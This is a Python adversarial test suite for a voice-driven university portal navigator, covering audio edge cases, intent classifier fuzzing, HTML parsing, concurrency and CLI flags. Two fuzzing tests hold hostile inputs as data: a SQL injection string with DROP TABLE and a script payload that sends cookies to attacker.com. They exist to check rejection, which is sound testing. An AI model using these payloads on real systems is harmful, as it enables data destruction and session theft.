#!/usr/bin/env python3
"""
Tier 5 Adversarial Coverage Hardening Test Suite for REIA.

Extensively stress-tests boundary limits, corrupted inputs, numerical extremes,
concurrency, memory stability, and malformed data across all 5 subsystems:
1. Audio DSP (extreme waveforms, DC rails, Nyquist, clipping, edge sample rates, malformed headers)
2. Neural classification (missing weights fallback, corrupted weights, temperature extremes, OOV fuzzing)
3. Navigation (HTML parser injection, deeply nested DOMs, invalid image dimensions, concurrent artifact writing)
4. Pipeline (thread safety, signal handling/exceptions, 100+ rapid sequential iterations, memory boundedness)
5. CLI (argument fuzzing, unexpected inputs, conflicting flags, schema validation)
"""

from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor
import datetime
import gc
import io
import json
import math
import os
from pathlib import Path
import random
import struct
import subprocess
import sys
import tempfile
import time
import tracemalloc
from typing import Any, Dict, List, Optional
import wave

# Ensure project root is in sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from reia.audio.sanitization import sanitize_transcription
from reia.audio.sources import BytesAudioSource, FileAudioSource
from reia.audio.synthetic import SyntheticAudioGenerator
from reia.audio.validation import (
    AudioMetrics,
    AudioStatus,
    AudioValidationResult,
    validate_and_process_audio,
    validate_or_raise,
)
from reia.core.exceptions import (
    AudioValidationError,
    CorruptedAudioError,
    EmptyAudioError,
    ExcessiveNoiseError,
    SilenceDetectedError,
)
from reia.navigation.artifacts import ArtifactEngine, generate_png_bytes
from reia.navigation.base import BaseNavigator, NavigationResult
from reia.navigation.mock_driver import MockNavigator, _SimpleHTMLDataExtractor
from reia.navigation.routes import CANONICAL_ROUTES, get_navigator, get_target_url
from reia.neural.dataset import CLASSES_DESTINO, TRAINING_DATA
from reia.neural.model import PurePythonMLP
from reia.neural.persistence import export_model_to_json, load_model_from_json
from reia.neural.thresholding import ClassificationResult, NeuralIntentClassifier
from reia.neural.vectorizer import VocabularyVectorizer
from reia.pipeline.cli import build_parser, format_human_output, main as cli_main
from reia.pipeline.coordinator import PipelineResult, VoiceNavigationPipeline


# ===========================================================================
# Helper: WAV Generator for Custom Samples and Sample Rates
# ===========================================================================
def _create_custom_wav(
    samples: List[float],
    sample_rate: int = 16000,
    channels: int = 1,
    sampwidth: int = 2,
) -> bytes:
    """Generates a binary WAV byte stream with custom parameters."""
    buf = io.BytesIO()
    with wave.open(buf, "wb") as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(sampwidth)
        wf.setframerate(sample_rate)
        raw = bytearray()
        for s in samples:
            clamped = max(min(s, 1.0), -1.0)
            int_val = int(clamped * 32767)
            raw.extend(struct.pack("<h", int_val))
        wf.writeframes(raw)
    return buf.getvalue()


# ===========================================================================
# 1. Audio DSP Adversarial Tests
# ===========================================================================
def test_audio_dsp_extreme_positive_dc_rail():
    """Attack 1.1: Constant +1.0 DC rail waveform (max positive float).
    Has zero dynamic speech variation; noise floor == speech level (SNR = 0 dB).
    Must be rejected as EXCESSIVE_NOISE.
    """
    sample_rate = 16000
    num_samples = sample_rate * 2  # 2.0s
    samples = [1.0] * num_samples
    wav_bytes = _create_custom_wav(samples, sample_rate)

    res = validate_and_process_audio(wav_bytes)
    assert res.is_valid is False
    assert res.status == AudioStatus.EXCESSIVE_NOISE
    assert res.snr_db <= 0.5


def test_audio_dsp_extreme_negative_dc_rail():
    """Attack 1.2: Constant -1.0 DC rail waveform (max negative float).
    Must be rejected as EXCESSIVE_NOISE.
    """
    sample_rate = 16000
    num_samples = sample_rate * 2
    samples = [-1.0] * num_samples
    wav_bytes = _create_custom_wav(samples, sample_rate)

    res = validate_and_process_audio(wav_bytes)
    assert res.is_valid is False
    assert res.status == AudioStatus.EXCESSIVE_NOISE


def test_audio_dsp_extreme_nyquist_oscillation():
    """Attack 1.3: Alternating Nyquist oscillation (+1.0, -1.0, +1.0, -1.0...).
    Represents an 8 kHz full-scale square wave at 16 kHz sample rate.
    Zero phonetic modulation (SNR = 0 dB) -> rejected as EXCESSIVE_NOISE.
    """
    sample_rate = 16000
    num_samples = sample_rate * 2
    samples = [1.0 if i % 2 == 0 else -1.0 for i in range(num_samples)]
    wav_bytes = _create_custom_wav(samples, sample_rate)

    res = validate_and_process_audio(wav_bytes)
    assert res.is_valid is False
    assert res.status == AudioStatus.EXCESSIVE_NOISE


def test_audio_dsp_near_zero_epsilon_amplitude():
    """Attack 1.4: Ultra-low amplitude near-epsilon floating point signal (1e-6).
    RMS energy is approx -120 dBFS -> rejected as SILENCE_DETECTED.
    """
    sample_rate = 16000
    num_samples = sample_rate * 2
    samples = [1e-6 * math.sin(2 * math.pi * 440.0 * (i / sample_rate)) for i in range(num_samples)]
    wav_bytes = _create_custom_wav(samples, sample_rate)

    res = validate_and_process_audio(wav_bytes)
    assert res.is_valid is False
    assert res.status == AudioStatus.SILENCE_DETECTED
    assert res.rms_dbfs < -46.0


def test_audio_dsp_clipped_waveform_detection():
    """Attack 1.5: Saturated / clipped speech waveform (peak >= 0.99).
    Acoustic metrics must flag is_clipped == True.
    """
    # Generate mock speech and artificially amplify by 3.0 to cause severe clipping
    raw_speech = SyntheticAudioGenerator.generate_mock_speech(duration_sec=3.0)
    with wave.open(io.BytesIO(raw_speech), "rb") as wf:
        n_frames = wf.getnframes()
        raw_frames = wf.readframes(n_frames)
        unpacked = struct.unpack(f"<{n_frames}h", raw_frames)
        # Multiply by 3.0 and clamp
        clipped_samples = [max(min((s / 32768.0) * 3.0, 1.0), -1.0) for s in unpacked]

    clipped_wav = _create_custom_wav(clipped_samples, 16000)
    res = validate_and_process_audio(clipped_wav)
    assert res.metrics is not None
    assert res.metrics.is_clipped is True
    assert res.metrics.peak_amplitude >= 0.99


def test_audio_dsp_massive_dc_offset_rejection():
    """Attack 1.6: Adding massive DC offset (+0.80) to speech.
    Destroys dynamic SNR floor because the unshifted floor is elevated to 0.80 (~ -1.9 dBFS).
    Must be rejected as EXCESSIVE_NOISE.
    """
    raw_speech = SyntheticAudioGenerator.generate_mock_speech(duration_sec=3.0)
    with wave.open(io.BytesIO(raw_speech), "rb") as wf:
        n_frames = wf.getnframes()
        unpacked = struct.unpack(f"<{n_frames}h", wf.readframes(n_frames))
        offset_samples = [(s / 32768.0) * 0.2 + 0.80 for s in unpacked]

    offset_wav = _create_custom_wav(offset_samples, 16000)
    res = validate_and_process_audio(offset_wav)
    assert res.is_valid is False
    assert res.status in (AudioStatus.EXCESSIVE_NOISE, AudioStatus.SILENCE_DETECTED)


def test_audio_dsp_mild_dc_offset_sanitization():
    """Attack 1.7: Adding mild DC offset (+0.05) to valid speech.
    Validation engine must clean the DC offset and produce a valid, normalized WAV.
    """
    raw_speech = SyntheticAudioGenerator.generate_mock_speech(duration_sec=3.0)
    with wave.open(io.BytesIO(raw_speech), "rb") as wf:
        n_frames = wf.getnframes()
        unpacked = struct.unpack(f"<{n_frames}h", wf.readframes(n_frames))
        mild_samples = [(s / 32768.0) + 0.05 for s in unpacked]

    mild_wav = _create_custom_wav(mild_samples, 16000)
    res = validate_and_process_audio(mild_wav)
    assert res.is_valid is True
    assert res.status == AudioStatus.VALID
    assert res.processed_wav_bytes is not None

    # Inspect processed audio: DC offset must be removed (mean amplitude near 0.0)
    with wave.open(io.BytesIO(res.processed_wav_bytes), "rb") as pwf:
        p_frames = pwf.getnframes()
        p_unpacked = struct.unpack(f"<{p_frames}h", pwf.readframes(p_frames))
        mean_offset = sum(p_unpacked) / (len(p_unpacked) * 32768.0)
        assert abs(mean_offset) < 0.02


def test_audio_dsp_edge_sample_rate_8000hz():
    """Attack 1.8: Edge sample rate: 8000 Hz (telephony narrow-band)."""
    raw_speech = SyntheticAudioGenerator.generate_mock_speech(duration_sec=3.0)
    # Downsample frames to 8kHz by taking every 2nd sample
    with wave.open(io.BytesIO(raw_speech), "rb") as wf:
        unpacked = struct.unpack(f"<{wf.getnframes()}h", wf.readframes(wf.getnframes()))
        downsampled = [unpacked[i] / 32768.0 for i in range(0, len(unpacked), 2)]

    wav_8k = _create_custom_wav(downsampled, sample_rate=8000)
    res = validate_and_process_audio(wav_8k)
    assert res.duration_seconds == 3.0
    assert res.is_valid is True
    assert res.metrics.sample_rate == 8000


def test_audio_dsp_edge_sample_rate_48000hz():
    """Attack 1.9: Edge sample rate: 48000 Hz (studio audio standard)."""
    raw_speech = SyntheticAudioGenerator.generate_mock_speech(duration_sec=2.0)
    with wave.open(io.BytesIO(raw_speech), "rb") as wf:
        unpacked = struct.unpack(f"<{wf.getnframes()}h", wf.readframes(wf.getnframes()))
        # Triple each sample to simulate 48kHz
        upsampled = []
        for s in unpacked:
            val = s / 32768.0
            upsampled.extend([val, val, val])

    wav_48k = _create_custom_wav(upsampled, sample_rate=48000)
    res = validate_and_process_audio(wav_48k)
    assert abs(res.duration_seconds - 2.0) < 0.01
    assert res.is_valid is True
    assert res.metrics.sample_rate == 48000


def test_audio_dsp_edge_sample_rate_96000hz():
    """Attack 1.10: Edge sample rate: 96000 Hz (hi-res audio)."""
    raw_speech = SyntheticAudioGenerator.generate_mock_speech(duration_sec=1.5)
    with wave.open(io.BytesIO(raw_speech), "rb") as wf:
        unpacked = struct.unpack(f"<{wf.getnframes()}h", wf.readframes(wf.getnframes()))
        upsampled = []
        for s in unpacked:
            val = s / 32768.0
            upsampled.extend([val] * 6)

    wav_96k = _create_custom_wav(upsampled, sample_rate=96000)
    res = validate_and_process_audio(wav_96k)
    assert abs(res.duration_seconds - 1.5) < 0.01
    assert res.is_valid is True
    assert res.metrics.sample_rate == 96000


def test_audio_dsp_malformed_wav_truncated_header():
    """Attack 1.11: WAV stream with truncated 12-byte header."""
    truncated = b"RIFF\x24\x00\x00\x00WAVE"
    res = validate_and_process_audio(truncated)
    assert res.is_valid is False
    assert res.status == AudioStatus.CORRUPTED_FORMAT
    assert res.error_code == "ERR_AUDIO_CORRUPTED"


def test_audio_dsp_malformed_wav_zero_bytes():
    """Attack 1.12: Empty audio buffer (0 bytes)."""
    res = validate_and_process_audio(b"")
    assert res.is_valid is False
    assert res.status == AudioStatus.EMPTY_INPUT
    assert res.error_code == "ERR_AUDIO_EMPTY"


def test_audio_dsp_malformed_wav_unsupported_8bit():
    """Attack 1.13: Valid WAV header specifying 8-bit PCM (sampwidth=1).
    Validation engine strictly requires 16-bit PCM.
    """
    buf = io.BytesIO()
    with wave.open(buf, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(1)  # 8-bit
        wf.setframerate(16000)
        wf.writeframes(b"\x80" * 32000)  # 2.0s of silence (128 unsigned)

    res = validate_and_process_audio(buf.getvalue())
    assert res.is_valid is False
    assert res.status == AudioStatus.CORRUPTED_FORMAT
    assert res.error_code == "ERR_UNSUPPORTED_SAMPLE_WIDTH"


def test_audio_dsp_malformed_wav_unsupported_24bit():
    """Attack 1.14: Valid WAV header specifying 24-bit PCM (sampwidth=3)."""
    buf = io.BytesIO()
    with wave.open(buf, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(3)  # 24-bit
        wf.setframerate(16000)
        wf.writeframes(b"\x00" * 48000)

    res = validate_and_process_audio(buf.getvalue())
    assert res.is_valid is False
    assert res.status == AudioStatus.CORRUPTED_FORMAT
    assert res.error_code == "ERR_UNSUPPORTED_SAMPLE_WIDTH"


def test_audio_dsp_malformed_wav_corrupted_frame_payload():
    """Attack 1.15: WAV header claiming 50,000 frames but payload truncated to 10 bytes."""
    valid = SyntheticAudioGenerator.generate_mock_speech(duration_sec=2.0)
    # Truncate payload after standard 44-byte WAV header
    truncated_payload = valid[:54]
    res = validate_and_process_audio(truncated_payload)
    assert res.is_valid is False
    assert res.status == AudioStatus.CORRUPTED_FORMAT


def test_audio_dsp_malformed_wav_random_binary():
    """Attack 1.16: Arbitrary pseudo-random binary bytes."""
    random_bytes = os.urandom(2048)
    res = validate_and_process_audio(random_bytes)
    assert res.is_valid is False
    assert res.status == AudioStatus.CORRUPTED_FORMAT


# ===========================================================================
# 2. Neural Classification Adversarial Tests
# ===========================================================================
def test_neural_missing_weights_fallback():
    """Attack 2.1: Initializing NeuralIntentClassifier with non-existent weights path.
    Must gracefully fallback to on-the-fly training without failing, and classify accurately.
    """
    clf = NeuralIntentClassifier(weights_path="/nonexistent/dir/missing_weights.json")
    assert clf.model is not None
    assert clf.vectorizer is not None

    res = clf.classify("quero ver o guia universitario de cursos")
    assert res.is_valid_intent is True
    assert res.intent_name == "GUIA_UNIVERSITARIO"
    assert res.confidence >= 0.65


def test_neural_corrupted_weights_rejection(tmp_path):
    """Attack 2.2: Initializing with a corrupted / truncated JSON weights file.
    `load_model_from_json` must cleanly raise JSONDecodeError or KeyError.
    """
    corrupt_file = tmp_path / "corrupt_weights.json"
    corrupt_file.write_text('{"vocab": ["vestibular"], "broken_json": ', encoding="utf-8")

    raised = False
    try:
        load_model_from_json(str(corrupt_file))
    except (json.JSONDecodeError, KeyError, Exception):
        raised = True
    assert raised is True


def test_neural_numerical_extreme_cold_temperature():
    """Attack 2.3: Temperature approaching zero (temperature=1e-6).
    Produces pseudo-argmax one-hot distribution. Invariant: no NaN, no inf, no overflow.
    """
    clf = NeuralIntentClassifier(temperature=1e-6)
    res = clf.classify("quero ver o guia universitario de apresentacao")
    assert res.is_valid_intent is True
    assert not math.isnan(res.confidence)
    assert not math.isinf(res.confidence)
    assert abs(res.confidence - 1.0) < 1e-4
    assert abs(res.margin - 1.0) < 1e-4
    assert abs(res.entropy - 0.0) < 1e-4


def test_neural_numerical_extreme_hot_temperature():
    """Attack 2.4: Extremely high temperature (temperature=1e6).
    Produces maximum-entropy uniform distribution ([1/3, 1/3, 1/3]).
    Margin collapses to 0.0, entropy approaches 1.0 -> rejected as AMBIGUOUS_INTENT.
    """
    clf = NeuralIntentClassifier(temperature=1e6)
    res = clf.classify("quero ver o guia universitario de apresentacao")
    assert res.is_valid_intent is False
    assert res.rejection_code == "AMBIGUOUS_INTENT"
    assert abs(res.confidence - (1.0 / 3.0)) < 1e-3
    assert res.margin < 0.01
    assert res.entropy > 0.95


def test_neural_numerical_invalid_temperature_zero_or_negative():
    """Attack 2.5: Zero or negative temperature values must raise ValueError."""
    for bad_temp in [0.0, -0.001, -10.0]:
        raised = False
        try:
            NeuralIntentClassifier(temperature=bad_temp)
        except ValueError:
            raised = True
        assert raised is True, f"Failed to raise ValueError on temperature={bad_temp}"


def test_neural_oov_fuzzing_massive_tokens():
    """Attack 2.6: Massive input of 5,000 random Out-of-Vocabulary tokens.
    Must evaluate in < 0.05s and reject cleanly as OOD_NO_DOMAIN_KEYWORDS.
    """
    clf = NeuralIntentClassifier()
    rng = random.Random(42)
    fake_tokens = [f"gibberishword{rng.randint(1000, 999999)}" for _ in range(5000)]
    fuzzed_text = " ".join(fake_tokens)

    start = time.perf_counter()
    res = clf.classify(fuzzed_text)
    duration = time.perf_counter() - start

    assert res.is_valid_intent is False
    assert res.rejection_code == "OOD_NO_DOMAIN_KEYWORDS"
    assert duration < 0.1  # Fast evaluation


def test_neural_oov_fuzzing_emojis_and_symbols():
    """Attack 2.7: Complex emoji storm and non-Latin mathematical symbols."""
    clf = NeuralIntentClassifier()
    emoji_payload = "🚀🔥🤖💯✨🎉🍕🍔🚲💻 ∑∏√∫≈≠≤≥ 漢字 العربية Кириллица"
    res = clf.classify(emoji_payload)
    assert res.is_valid_intent is False
    assert res.rejection_code in ("EMPTY_INPUT", "OOD_NO_DOMAIN_KEYWORDS")


def test_neural_oov_fuzzing_sql_injection():
    """Attack 2.8: SQL injection payloads in speech text."""
    clf = NeuralIntentClassifier()
    payload = "' OR '1'='1'; DROP TABLE candidatos; SELECT * FROM vestibular; --"
    res = clf.classify(payload)
    assert res.is_valid_intent is False
    # Notice: 'vestibular' is an anchor word! If anchor word present without intent, AMBIGUOUS_DOMAIN_ONLY
    # If no intent words:
    assert res.rejection_code in ("AMBIGUOUS_DOMAIN_ONLY", "OOD_NO_DOMAIN_KEYWORDS")


def test_neural_oov_fuzzing_xss_and_html_injection():
    """Attack 2.9: Cross-Site Scripting (XSS) and HTML tags in speech text."""
    clf = NeuralIntentClassifier()
    payload = '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'
    res = clf.classify(payload)
    assert res.is_valid_intent is False
    assert res.rejection_code == "OOD_NO_DOMAIN_KEYWORDS"


def test_neural_oov_fuzzing_control_characters():
    """Attack 2.10: Null bytes, ANSI escape sequences, control characters."""
    clf = NeuralIntentClassifier()
    payload = "\x00\x1b[31;1m\r\n\t\x07\x08quero abrir manual candidato\x00\x1b[0m"
    res = clf.classify(payload)
    # Sanitizer cleans control chars, leaving 'quero abrir manual candidato' -> valid!
    assert res.is_valid_intent is True
    assert res.intent_name == "MANUAL_DO_CANDIDATO"


def test_neural_oov_fuzzing_empty_and_whitespace():
    """Attack 2.11: Whitespace-only, empty strings, and None."""
    clf = NeuralIntentClassifier()
    for empty_input in ["", "   ", "\t\t\n\r  ", None]:
        res = clf.classify(empty_input)
        assert res.is_valid_intent is False
        assert res.rejection_code == "EMPTY_INPUT"


# ===========================================================================
# 3. Web Navigation Adversarial Tests
# ===========================================================================
def test_navigation_html_parser_deeply_nested_dom():
    """Attack 3.1: Parsing deeply nested DOM tree (500 levels deep).
    HTMLParser must parse without recursion overflow or stack exhaustion.
    """
    nested_html = "<div>" * 500 + "<h1>Vestibular PUC Deep</h1>" + "</div>" * 500
    parser = _SimpleHTMLDataExtractor()
    parser.feed(nested_html)
    assert "Vestibular PUC Deep" in parser.headings


def test_navigation_html_parser_malformed_unclosed_tags():
    """Attack 3.2: Malformed HTML with unquoted attributes, nested formatting, and unclosed body/html tags."""
    malformed_html = """
    <html><head><title>Título Malformado</title>
    <body>
    <h1>Primeiro Título</h1>
    <h2>Segundo <b>Título Incompleto</b></h2>
    <a href=/link-sem-aspas>Texto do Link</a>
    <a href="incompleto">Outro Link</a>
    """
    parser = _SimpleHTMLDataExtractor()
    parser.feed(malformed_html)
    assert len(parser.headings) == 2
    assert "Primeiro Título" in parser.headings
    assert "Segundo Título Incompleto" in parser.headings
    assert len(parser.links) == 2


def test_navigation_html_parser_script_content_not_extracted_as_heading():
    """Attack 3.3: Script tags containing fake H1/H2 markup."""
    html_with_script = """
    <!DOCTYPE html><html><head><title>Test</title></head>
    <body>
        <h1>Heading Legítimo</h1>
        <script>
            var fake = "<h1>Fake Heading</h1>";
        </script>
        <h2>Heading 2 Legítimo</h2>
    </body></html>
    """
    parser = _SimpleHTMLDataExtractor()
    parser.feed(html_with_script)
    assert "Heading Legítimo" in parser.headings
    assert "Heading 2 Legítimo" in parser.headings


def test_navigation_png_generator_invalid_dimensions():
    """Attack 3.4: Generating PNG with non-positive dimensions must raise ValueError."""
    for w, h in [(0, 800), (1280, 0), (-100, 800), (1280, -50), (0, 0)]:
        raised = False
        try:
            generate_png_bytes(width=w, height=h)
        except ValueError:
            raised = True
        assert raised is True, f"Failed to raise ValueError for dimensions {w}x{h}"


def test_navigation_png_generator_boundary_dimensions_1x1():
    """Attack 3.5: Boundary dimension: 1x1 pixel micro-PNG.
    Must generate valid PNG conforming strictly to ISO/IEC 15948:2004.
    """
    png_bytes = generate_png_bytes(width=1, height=1, bg_rgb=(255, 0, 0))
    assert png_bytes.startswith(b"\x89PNG\r\n\x1a\n")
    assert b"IHDR" in png_bytes
    assert b"IDAT" in png_bytes
    assert b"IEND" in png_bytes


def test_navigation_png_generator_boundary_dimensions_4k():
    """Attack 3.6: High-resolution 4K (3840x2160) synthetic PNG generation."""
    t0 = time.time()
    png_bytes = generate_png_bytes(width=3840, height=2160, bg_rgb=(10, 20, 30))
    duration = time.time() - t0
    assert png_bytes.startswith(b"\x89PNG\r\n\x1a\n")
    assert duration < 2.0  # Must compress and serialize reasonably fast


def test_navigation_concurrent_artifact_writing(tmp_path):
    """Attack 3.7: 30 concurrent threads writing screenshots and metadata to the same directory.
    Must generate unique filenames with zero collisions and 100% valid JSON files.
    """
    engine = ArtifactEngine(artifacts_dir=tmp_path / "concurrent_artifacts")

    def write_task(idx: int) -> tuple[str, str]:
        png = generate_png_bytes(100, 100)
        s_path = engine.save_screenshot(f"INTENT_{idx}", image_bytes=png)
        m_path = engine.save_metadata(
            intent_name=f"INTENT_{idx}",
            target_url=f"https://vestibular.puc-campinas.edu.br/{idx}",
            page_title=f"Page {idx}",
            headings=[f"Heading {idx}"],
            screenshot_path=s_path,
        )
        return s_path, m_path

    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(write_task, range(30)))

    assert len(results) == 30
    screenshot_paths = [r[0] for r in results]
    metadata_paths = [r[1] for r in results]

    # Verify uniqueness of paths (zero collision)
    assert len(set(screenshot_paths)) == 30
    assert len(set(metadata_paths)) == 30

    # Verify all JSON metadata files are well-formed and contain matching indices
    for idx, m_path in enumerate(metadata_paths):
        content = json.loads(Path(m_path).read_text(encoding="utf-8"))
        assert content["intent_name"] == f"INTENT_{idx}"
        assert Path(content["screenshot_path"]).exists()


def test_navigation_mock_navigator_fallback_on_unknown_intent(tmp_path):
    """Attack 3.8: MockNavigator invoked with unrecognized intent name.
    Must safely fallback to root vestibular portal rather than crashing.
    """
    nav = MockNavigator(artifacts_dir=tmp_path / "nav_fallback")
    res = nav.navigate(target_url="https://vestibular.puc-campinas.edu.br/unknown", intent_name="UNKNOWN_INTENT")
    # Will report failure to find HTML fixture for UNKNOWN_INTENT with clean error message
    assert res.success is False
    assert "não foi encontrada" in res.error_message


# ===========================================================================
# 4. Pipeline Orchestration Adversarial Tests
# ===========================================================================
def test_pipeline_multi_threaded_concurrency(tmp_path):
    """Attack 4.1: Concurrency stress: 10 worker threads executing voice navigation simultaneously.
    Verifies that shared pipeline components are thread-safe and produce isolated results.
    """
    pipeline = VoiceNavigationPipeline(
        navigator_mode="mock",
        artifacts_dir=str(tmp_path / "concurrency_artifacts"),
    )

    test_queries = [
        ("quero ver o guia universitario de apresentacao", "GUIA_UNIVERSITARIO"),
        ("abrir manual do candidato com as regras da prova", "MANUAL_DO_CANDIDATO"),
        ("como faco para me inscrever no vestibular da puc", "FORMULARIO_INSCRICAO"),
    ] * 4  # 12 items

    def run_query(item: tuple[str, str]) -> PipelineResult:
        query, expected_intent = item
        return pipeline.run(text=query)

    with ThreadPoolExecutor(max_workers=6) as executor:
        results = list(executor.map(run_query, test_queries))

    assert len(results) == 12
    for res, (query, expected_intent) in zip(results, test_queries):
        assert res.success is True, f"Failed query: {query}"
        assert res.classification.intent_name == expected_intent
        assert Path(res.screenshot_path).exists()
        assert Path(res.metadata_path).exists()


def test_pipeline_rapid_sequential_stress_100_iterations(tmp_path):
    """Attack 4.2: Stress testing: 120 rapid sequential pipeline runs cycling through
    valid and invalid scenarios (speech, silence, noise, short, long, OOD, ambiguous).
    Must achieve 100% stable execution with zero unhandled exceptions.
    """
    pipeline = VoiceNavigationPipeline(
        navigator_mode="mock",
        artifacts_dir=str(tmp_path / "rapid_artifacts"),
    )

    scenarios = [
        ("valid_guia", True),
        ("silence", False),
        ("valid_manual", True),
        ("noise", False),
        ("valid_inscricao", True),
        ("short", False),
    ]

    start = time.perf_counter()
    for i in range(120):
        scenario_key, should_succeed = scenarios[i % len(scenarios)]
        res = pipeline.run(synthetic=scenario_key)
        assert res.success == should_succeed, f"Mismatch at run {i} ({scenario_key}): got {res.success}"
    duration = time.perf_counter() - start

    assert duration < 10.0, f"120 rapid iterations took too long: {duration:.2f}s"


def test_pipeline_memory_stability_bounded_growth(tmp_path):
    """Attack 4.3: Memory leak stress: Monitors heap memory across 100 sequential iterations.
    Heap allocation growth must remain strictly bounded (< 15 MB).
    """
    gc.collect()
    tracemalloc.start()

    pipeline = VoiceNavigationPipeline(
        navigator_mode="mock",
        artifacts_dir=str(tmp_path / "memory_artifacts"),
    )

    # 100 sequential runs cycling between commands
    for i in range(100):
        cmd = "quero ver o guia universitario" if i % 2 == 0 else "abrir manual do candidato"
        res = pipeline.run(text=cmd)
        assert res.success is True

    gc.collect()
    current, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()

    peak_mb = peak / (1024 * 1024)
    assert peak_mb < 15.0, f"Potential memory leak detected: {peak_mb:.2f} MB peak"


def test_pipeline_simulated_navigation_exception_graceful_handling():
    """Attack 4.4: Injecting a simulated crashing navigator into the pipeline.
    Pipeline must intercept the exception, log it, return success=False, and NEVER crash.
    """
    class CrashingNavigator(BaseNavigator):
        def navigate(self, target_url: str, intent_name: str) -> NavigationResult:
            raise RuntimeError("Fatal simulated browser crash: SIGSEGV")

    pipeline = VoiceNavigationPipeline(navigator=CrashingNavigator())
    res = pipeline.run(text="quero ver o guia universitario")

    assert res.success is False
    assert res.stage == "WEB_NAVIGATION"
    assert res.status == "NAVIGATION_FAILED"
    assert res.error_code == "ERR_NAVIGATION_EXCEPTION"
    assert "Fatal simulated browser crash" in res.user_message


def test_pipeline_strict_early_exit_invariants(tmp_path):
    """Attack 4.5: Verifying strict early-exit invariants under corrupted and invalid inputs.
    Navigation must NEVER be invoked and no artifacts created if audio or neural gates reject.
    """
    artifacts_dir = tmp_path / "invariant_artifacts"

    class SpyNavigator(BaseNavigator):
        def __init__(self):
            self.was_called = False

        def navigate(self, target_url: str, intent_name: str) -> NavigationResult:
            self.was_called = True
            raise AssertionError("Invariant violation: Navigation was invoked on rejected input!")

    spy = SpyNavigator()
    pipeline = VoiceNavigationPipeline(navigator=spy, artifacts_dir=str(artifacts_dir))

    # 1. Invalid audio (silence)
    res_silence = pipeline.run(synthetic="silence")
    assert res_silence.success is False
    assert spy.was_called is False
    assert res_silence.navigation is None

    # 2. Out-of-Domain text
    res_ood = pipeline.run(text="qual a previsao do tempo para amanha em sao paulo")
    assert res_ood.success is False
    assert spy.was_called is False
    assert res_ood.navigation is None

    # 3. Ambiguous text
    res_amb = pipeline.run(text="quero ver o guia de cursos e fazer a inscricao agora mesmo")
    assert res_amb.success is False
    assert spy.was_called is False
    assert res_amb.navigation is None


# ===========================================================================
# 5. CLI Adversarial Tests
# ===========================================================================
def test_cli_missing_all_inputs():
    """Attack 5.1: CLI invoked with zero arguments must exit with code 1 (or 0 with --exit-zero)."""
    parser = build_parser()
    args = parser.parse_args([])
    assert args.audio is None
    assert args.text is None
    assert args.synthetic is None

    cp = subprocess.run([sys.executable, "-m", "reia"], capture_output=True, text=True)
    assert cp.returncode == 1
    assert "ERRO" in cp.stdout or "usage" in cp.stdout.lower() or "ajuda" in cp.stdout.lower()


def test_cli_nonexistent_audio_file():
    """Attack 5.2: CLI invoked with non-existent audio file."""
    cp = subprocess.run(
        [sys.executable, "-m", "reia", "--audio", "/nonexistent/path/missing.wav", "--navigator", "mock"],
        capture_output=True,
        text=True,
    )
    assert cp.returncode == 1
    assert "Erro ao carregar áudio" in cp.stdout or "Arquivo de áudio não encontrado" in cp.stdout


def test_cli_fuzzing_text_quotes_and_special_chars():
    """Attack 5.3: CLI invoked with complex quotation marks, slashes, and unicode emojis."""
    query = 'quero ver o "guia universitario" da PUC-Campinas! 🚀 // #vestibular'
    cp = subprocess.run(
        [sys.executable, "-m", "reia", "--text", query, "--navigator", "mock", "--json"],
        capture_output=True,
        text=True,
    )
    assert cp.returncode == 0
    payload = json.loads(cp.stdout)
    assert payload["success"] is True
    assert payload["classification"]["intent_name"] == "GUIA_UNIVERSITARIO"


def test_cli_conflicting_output_flags():
    """Attack 5.4: CLI invoked with conflicting flags: --json, --quiet, and --verbose simultaneously.
    --json has top priority and must output well-formed JSON.
    """
    cp = subprocess.run(
        [
            sys.executable,
            "-m",
            "reia",
            "--synthetic",
            "valid_manual",
            "--navigator",
            "mock",
            "--json",
            "--quiet",
            "--verbose",
        ],
        capture_output=True,
        text=True,
    )
    assert cp.returncode == 0
    payload = json.loads(cp.stdout)
    assert payload["success"] is True
    assert payload["stage"] == "WEB_NAVIGATION"
    assert payload["status"] == "COMPLETED"


def test_cli_json_contract_conformance():
    """Attack 5.5: CLI --json output schema conformance.
    Must contain all mandatory contract fields: success, stage, status, user_message, execution_time_seconds.
    """
    cp = subprocess.run(
        [sys.executable, "-m", "reia", "--synthetic", "silence", "--navigator", "mock", "--json"],
        capture_output=True,
        text=True,
    )
    assert cp.returncode == 1  # Rejected audio exits with 1
    payload = json.loads(cp.stdout)
    assert payload["success"] is False
    assert payload["stage"] == "AUDIO_VALIDATION"
    assert "status" in payload
    assert "user_message" in payload
    assert "execution_time_seconds" in payload


def test_cli_invalid_synthetic_scenario_rejected():
    """Attack 5.6: CLI invoked with invalid synthetic scenario choice.
    Argparse must reject it with exit code 2.
    """
    cp = subprocess.run(
        [sys.executable, "-m", "reia", "--synthetic", "invalid_scenario_12345"],
        capture_output=True,
        text=True,
    )
    assert cp.returncode == 2
    assert "invalid choice" in cp.stderr.lower() or "error" in cp.stderr.lower()


# ===========================================================================
# Standalone Master Runner
# ===========================================================================
if __name__ == "__main__":
    import inspect
    import traceback

    # Collect all test functions in this module
    current_module = sys.modules[__name__]
    test_functions = [
        getattr(current_module, name)
        for name in sorted(dir(current_module))
        if name.startswith("test_") and callable(getattr(current_module, name))
    ]

    print("======================================================================")
    print("REIA Tier 5 Adversarial Coverage Hardening Test Suite")
    print(f"Total Adversarial Attack Cases: {len(test_functions)}")
    print("======================================================================")

    start_time = time.time()
    passed = 0
    failed = 0

    for test_fn in test_functions:
        fn_name = test_fn.__name__
        try:
            sig = inspect.signature(test_fn)
            if "tmp_path" in sig.parameters:
                with tempfile.TemporaryDirectory() as td:
                    test_fn(Path(td))
            else:
                test_fn()
            passed += 1
            print(f"  PASS: {fn_name}")
        except Exception as exc:
            failed += 1
            print(f"  FAIL: {fn_name}: {exc}")
            traceback.print_exc()

    elapsed = time.time() - start_time
    print("======================================================================")
